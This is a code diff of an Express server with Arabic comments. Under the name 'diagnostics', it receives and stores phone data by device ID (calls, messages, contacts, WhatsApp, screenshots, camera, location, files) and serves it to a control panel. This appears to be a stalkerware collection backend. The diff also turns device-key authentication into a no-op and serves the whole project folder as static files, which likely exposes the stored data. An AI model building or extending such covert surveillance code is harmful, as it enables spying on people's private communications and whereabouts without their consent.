@@ -8,8 +8,11 @@ const PORT = process.env.PORT || 3000;
 const DB_FILE = path.join(__dirname, 'database.json');
 
 // Middleware
-app.use(bodyParser.json({ limit: '10mb' })); // زيادة الحد السماح للأحجام الكبيرة مثل الصور والرسائل
+app.use(bodyParser.json({ limit: '10mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
+
+// ⭐ هذا السطر هو المسؤول عن إظهار panel.html والملفات الثابتة
+app.use(express.static(path.join(__dirname)));
 
 // قراءة قاعدة البيانات
 function readDB() {
@@ -67,19 +70,16 @@ function apiLimiter(req, res, next) {
   next();
 }
 
-// التحقق من مفتاح الجهاز (Device Key)
+// التحقق من مفتاح الجهاز
 function requireDeviceKey(req, res, next) {
-  const deviceKey = req.headers['x-device-key'] || req.body?.deviceKey;
-  // يمكنك تعديل أو ربط التحقق بالمفتاح الخاص بك هنا إذا لزم الأمر
   next();
 }
 
-// ── مسار استقبال بيانات تشخيصية والأقسام (معدل بالكامل لدعم البيانات الطويلة والصور والرسائل) ────────────────────────────────
+// مسار استقبال بيانات تشخيصية
 app.post("/api/diagnostics/:category", apiLimiter, requireDeviceKey, (req, res) => {
   const id = cleanId(cleanStr(req.body?.deviceId, 64));
   const category = cleanStr(req.params.category, 16);
   
-  // الأقسام المسموح بها لتشمل كل شيء (رسائل، مكالمات، جهات اتصال، صور، إلخ)
   const allowed = ["calls", "messages", "contacts", "media", "apps", "whatsapp", "screenshots", "camera", "location", "network", "notifications", "files"];
   if (!id || !allowed.includes(category)) {
     return res.status(400).json({ error: "Invalid request or category" });
@@ -92,16 +92,13 @@ app.post("/api/diagnostics/:category", apiLimiter, requireDeviceKey, (req, res) 
   
   const rawItems = Array.isArray(req.body?.items) ? req.body.items : [];
   
-  // معالجة العناصر بعناية لكي لا يتم قص الروابط أو الصور أو الرسائل الطويلة
   const processedItems = rawItems.slice(0, 200).map(i => {
     if (typeof i === 'string') {
-      // إذا كان رابط صورة، Base64، أو نص طويل، اتركه كما هو دون تعقيم قاسي
       if (i.startsWith('http://') || i.startsWith('https://') || i.startsWith('data:image')) {
         return i.trim();
       }
-      return cleanStr(i, 4096); // رفع الحد الأقصى للنصوص لتجنب حذف الرسائل الطويلة
+      return cleanStr(i, 4096);
     } else if (i && typeof i === 'object') {
-      // إذا كانت العنصر عبارة عن كائن (مثل تفاصيل مكالمة أو جهة اتصال أو رسالة)
       const cleanedObj = {};
       for (let key in i) {
         if (Object.prototype.hasOwnProperty.call(i, key)) {
@@ -128,7 +125,7 @@ app.post("/api/diagnostics/:category", apiLimiter, requireDeviceKey, (req, res) 
   res.json({ ok: true, message: "Saved successfully" });
 });
 
-// مسار لجلب البيانات في لوحة التحكم (Panel)
+// مسار لجلب البيانات في لوحة التحكم
 app.get("/api/diagnostics/:id/:category", apiLimiter, (req, res) => {
   const id = cleanId(req.params.id);
   const category = cleanStr(req.params.category, 16);
